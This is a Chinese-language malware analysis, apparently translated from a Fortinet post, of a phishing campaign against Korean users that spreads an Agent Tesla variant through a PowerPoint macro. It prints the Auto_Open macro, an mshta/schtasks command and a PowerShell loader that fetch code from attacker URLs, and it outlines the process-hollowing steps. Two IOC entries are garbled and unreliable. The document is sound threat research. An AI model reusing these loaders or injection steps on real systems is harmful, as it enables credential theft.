Fortinet FortiGuard 实验室近期发现了针对韩国发起攻击的网络钓鱼攻击，邮件使用韩文书写并要求收件人打开附件中的 PowerPoint
文件以查看采购订单，该恶意PowerPoint 文件会传播 Agent Tesla 的新变种。

自从 2014 年 Agent Tesla 被发现以来一直非常活跃，多个变种层出不穷。Agent Tesla 是一个 .Net
编写的恶意软件，主要用于从失陷主机上窃取敏感信息，如剪贴板数据、键盘按键记录、软件凭据（浏览器、邮件、VPN、FTP、即时通信软件等）、屏幕截图等。

## 钓鱼邮件

邮件中的韩文试图引诱收件人打开附件以确认采购订单。

![image.png-275.3kB](https://image.3001.net/images/20211216/1639635526_61bada46e6af2c96c6677.png!small)

钓鱼邮件

## 恶意 PowerPoint

PowerPoint 文件中包含一个名为 Auto_Open() 的宏代码，在打开文件时就调用该函数。

VBA 代码如下所示：

> Sub Auto_Open()
>
>  
>
>
> p_ = soraj.bear.GroupName
>
>  
>
>
> Shell p_
>
>  
>
>
> End Sub

soraj 是一个 UserForm 控件的名字，而bear 是 soraj 内的 CheckBox 控件的名称。攻击者调用 Shell 执行从 bear
控件的 GroupName 属性中读取的命令。

![](https://image.3001.net/images/20211216/1639635559_61bada6732c2e6598bf3f.png!small)

CheckBox 内容

如上所示，soraj.bear.GroupName 的值为 mshta hxxp[:]//bitly[.]com/gdhamksgdsadj。

命令由 mshta 和一个 URL 组成。mshta 可用于执行 HTML 应用程序文件以及 VBScript 脚本等，打开该 URL 后会被重定向到其他
URL（hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html）。响应中包含一段
VBScript 代码，用于将转义的代码写入由 mshta.exe 执行的当前 HTML 文件。

![](https://image.3001.net/images/20211216/1639635594_61bada8a17036f76d58dd.png!small)

请求交互

如上所示，响应数据中可以看到 URL 重定向和转义的 VBScript 代码。

这种 VBScript 代码被称为 VBScript-embedded-in-HTML，部分未转义代码如下所示：

![](https://image.3001.net/images/20211216/1639635618_61badaa2b893b48d8007e.png!small)

部分 VBScript 代码

## 脚本文件

攻击者在传播 Agent Tesla 的过程中使用了多种脚本，包括 VBScript-embedded-in-HTML、VBScript 和
PowerShell 等用于各种用途。

### 升级

恶意软件会每两个小时请求一次新版本，并在失陷主机上执行。为此，VBScript-embedded-in-HTML
执行命令将其添加到计划任务中。创建执行计划的命令如下所示：

> args = "/create /sc MINUTE /mo 120 /tn """"update-Yendex """" /F /tr
> """"\""""MsHtA""""\""""hxxps://madarbloghogya.blogspot.com/p/divineback222.html""""
>
>  
>
>
> Set Somosa = GetObject("new:13709620-C279-11CE-A49E-444553540000")
>
>  
>
>
> 'schtasks 'open
>
>  
>
>
> Somosa Shellexecute StrReverse("sksathcs"), args, "", StrReverse("nepo"), 0

![](https://image.3001.net/images/20211216/1639635664_61badad0e3bd4cb0f922a.png!small)定时任务持久化

在远程 HTML 文件中执行 VBScript 代码，会下载 Agent Tesla 到失陷主机，检测并终止正在运行的 Agent Tesla
进程，以进行升级。

### 持久化

从 VBScript-embedded-in-HTML 中提取的独立 VBS 文件 %Public%\hulalalMCROSOFT.vbs 会从
hxxps[:]//bitbucket[.]org/!api/2.0/ 下载另一个 base64 编码的 VBS 代码片段
/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine1-2 到本地。通过
base64 解码后，VBS 代码将会被保存到位于 %Public% 文件夹下的 UYA-update.vbs 文件中。

这个 VBS 代码片段会下载 Agent Tesla 并在失陷主机上执行。无论何时执行该 VBS 文件，都会启动 Agent Tesla。

为了维持持久化，Agent Tesla 会将 UYA-update.vbs 文件复制到 Startup 文件夹中并重命名为
GTQ.vbs，这能够使其在系统启动时自启动。

![](https://image.3001.net/images/20211216/1639635711_61badaffe0a096b0040a2.png!small)

VBS 脚本文件

### Process Hollowing

UYA-update.vbs 根据本地变量在 base64 解码出的 PE 文件中提取 PowerShell 代码，再调用 PowerShell.exe
执行。PE 文件是一个 .NET 程序，其中包含一个属于 ClassLibrary3.Class1 类、名为 Run() 的函数。

调用函数的 PowerShell 代码，如下所示：

>
> [System.AppDomain]::CurrentDomain.Load($fuUN).GetType('ClassLibrary3.Class1').GetMethod(
> 'Run' ).Invoke($null, [object[]]
> ('1-1enivid/selif/c4ab4d371cd40ce3303b4d33c868122f7cfd
> /do8qxn/aygoh/steppins/0.2/ipa!/gro.tekcubtib//:sptth'))

$fuUN 从解码的 .NET 文件中调用 GetType() 和 GetMethod() 来获取函数 ClassLibrary3.Class1.Run()
并通过 Invoke() 调用 Run() 函数，执行的参数是一个 URL，具体为
hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1。

函数 ClassLibrary3.Class1.Run() 的完整代码如下所示：

![](https://image.3001.net/images/20211216/1639635745_61badb218070da30409a7.png!small)

.NET 函数代码

调用函数 ClassLibrary3.Class1.Run() 后，通过链接下载 hxxp[:]//149.56.200.165/rump/1.txt（执行
Process Hollowing 的 .NET 模块）和
hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1（Agent
Tesla）。

Agent Tesla 在失陷主机上采用无文件执行，只存在于 PowerShell 进程的内存中。另一个 .NET 模块负责执行 Process
Hollowing 的函数为 ClassLibrary1.Class1.Run()，并且针对 RegAsm.exe 执行 Agent Tesla。

RegAsm.exe 是 Microsoft .Net Framework 的官方组件，攻击者将恶意软件注入其中规避检测。

.NET 模块中调用了许多 Windows API 函数将 Agent Tesla 注入目标进程。

> 通过带有 CREATE_SUSPENDED 标志的 CreateProcess() 创建挂起的exe 进程
>
> 通过
> VirtualAllocEx()、NtUnmapViewOfSection()、ReadProcessMemory()、WriteProcessMemory()
> 将 Agent Tesla 注入挂起的exe 进程新分配的内存中
>
> 通过
> SetThreadContext()/Wow64SetThreadContext()、GetThreadContext()/Wow64GetThreadContext()
> 修改exe 的注册表并修改 EIP 指针指向 Agent Tesla
>
> 通过 ResumeThread() 恢复执行exe 进程

Agent Tesla 执行后就会窃取受害者的私密信息。

## Agent Tesla

Agent Tesla 对外发布了 Setup 程序，可以根据攻击者启用的功能编译 Agent Tesla 程序。

Agent Tesla 可以通过 Main()（凭据窃取）、Timer（窃取剪贴板、屏幕截图等）和 Thread（通过浏览器窃取
Cookie）等函数启动需要执行的功能。

捕获的 Agent Tesla 变种只启用了凭据窃取与 Cookie 窃取功能，支持的客户端超过 70 个，如下所示：

> 基于 Chromium 的 Web 浏览器：Epic Privacy, Uran, Chedot, Comodo Dragon, Chromium,
> Orbitum, Cool Novo, Sputnik, Coowon, Brave, Liebao Browser, Elements
> Browser, Sleipnir 6, Vivaldi, 360 Browser, Torch Browser, Yandex Browser,
> QIP Surf, Amigo, Kometa, Citrio, Opera Browser, CentBrowser, 7Star, Coccoc,
> and Iridium Browser.
>
> 网页浏览器：Chrome, Microsoft Edge, Firefox, Safari, IceCat, Waterfox, Tencent
> QQBrowser, Flock Browser, SeaMonkey, IceDragon, Falkon, UCBrowser, Cyberfox,
> K-Meleon, PaleMoon.
>
> VPN 客户端：Open-VPN, Nord-VPN, RealVNC, TightVNC, UltraVNC, Private Internet
> Access VPN.
>
> FTP 客户端：FileZilla, Cftp, WS_FTP, FTP Navigator, FlashFXP, SmartFTP, WinSCP
> 2, CoreFTP, FTPGetter.
>
> 邮件客户端：Outlook, Postbox, Thunderbird, Mailbird, eM Client, Claws-mail, Opera
> Mail, Foxmail, Qualcomm Eudora, IncrediMail, Pocomail, Becky! Internet Mail,
> The Bat!.
>
> 即时通信客户端/下载工具：DownloadManager, jDownloader, Psi+, Trillian.
>
> 其他：MySQL and Microsoft Credentials.

![](https://image.3001.net/images/20211216/1639635776_61badb40c7ecd41d8bbce.png!small)

部分代码示意图

![](https://image.3001.net/images/20211216/1639635801_61badb59095044f45edba.png!small)

窃取信息示意图

上图显示了刚从 IceCat 程序窃取的凭据，Browser 是客户端名称、Password 是保存的密码、URL 是登录页面、UserName
是保存的用户名。

窃取的凭据保存在全局变量中，格式化后回传给攻击者。

## 数据回传

Agent Tesla 支持四种方式将窃取数据回传给攻击者，分别是 FTP、HTTP POST、SMTP、Telegram。

捕获的变种使用了 HTTP POST 方式。Agent Tesla 首先使用 DES 将数据加密，再利用 base64 编码后通过 HTTP POST
请求发送给攻击者。Agent Tesla 向硬编码的字符串 hxxp[:]//69[.]174.99[.]181/webpanel-divine/mawa/7dd66d9f8e1cf61ae198.php 发送请求。

![](https://image.3001.net/images/20211216/1639635827_61badb738e3f4c3cb42a9.png!small)

回传数据包

如上所示，Agent Tesla 将窃取的数据作为 p= 的值进行发送。

数据头中包含失陷主机的基本信息：“数据包编号”+“分隔符”+“受害者ID”+“分隔符”+“日期和时间”+“分隔符字符串”+“用户名/计算机名”+“分隔符”，后续紧跟着被窃取的信息。

![](https://image.3001.net/images/20211216/1639635876_61badba4b9ef180d13dbf.png!small)

回传信息格式

如上所示，为一个编号为 6 的数据包示例。分割字符串为
0de264895c1ed90486c73c6eb110af6c2222264a0854b0047b9ead88b718f7d0，受害者 ID
是根据系统硬件信息生成的 MD5 哈希。

Agent Tesla 共提供了七种数据包进行数据回传：

> 0：第一个数据包，通知攻击者 Agent Tesla 已经成功启动，只包含数据头。
>
> 1：每隔 120 秒发送一次的保活心跳数据包，只包含数据头。
>
> 2：每隔 60 秒发送一次的确认卸载数据包，响应中存在卸载命令时将会删除所有相关文件并且清除注册表
>
> 3：发送受害者键盘记录和剪贴板数据的数据包
>
> 4：发送受害者屏幕截图的数据包
>
> 5：发送受害者窃取凭据的数据包
>
> 6：发送受害者窃取的 Cookie 的数据包

## 结论

这次的钓鱼攻击针对韩国用户展开，攻击会传播 Agent Tesla 的一个新变种，并且回传相关信息给攻击者。

## IOC

> hxxps[:]//onedayiwillloveyouforever[.]blogspot[.]com/p/divine111.html  
> hxxps[:]//madarbloghogya[.]blogspot[.]com/p/divineback222.html  
> hxxps[:
> ]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine1-2  
> hxxp[:]//149[.]56.16500  
>
> hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1  
> hxxp[:]1.//64189[.]/ webpanel-divine/mawa/7dd66d9f8e1cf61ae198.php  
> AA121762EB34D32C7D831D7ABCEC34F5A4241AF9E669E5CC43A49A071BD6E894  
> 0BBF16E320FB942E4EA09BB9E953076A4620F59E5FFAEFC3A2FFE8B8C2B3389C

## 参考来源

[Fortinet](https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-tesla-new-variant)

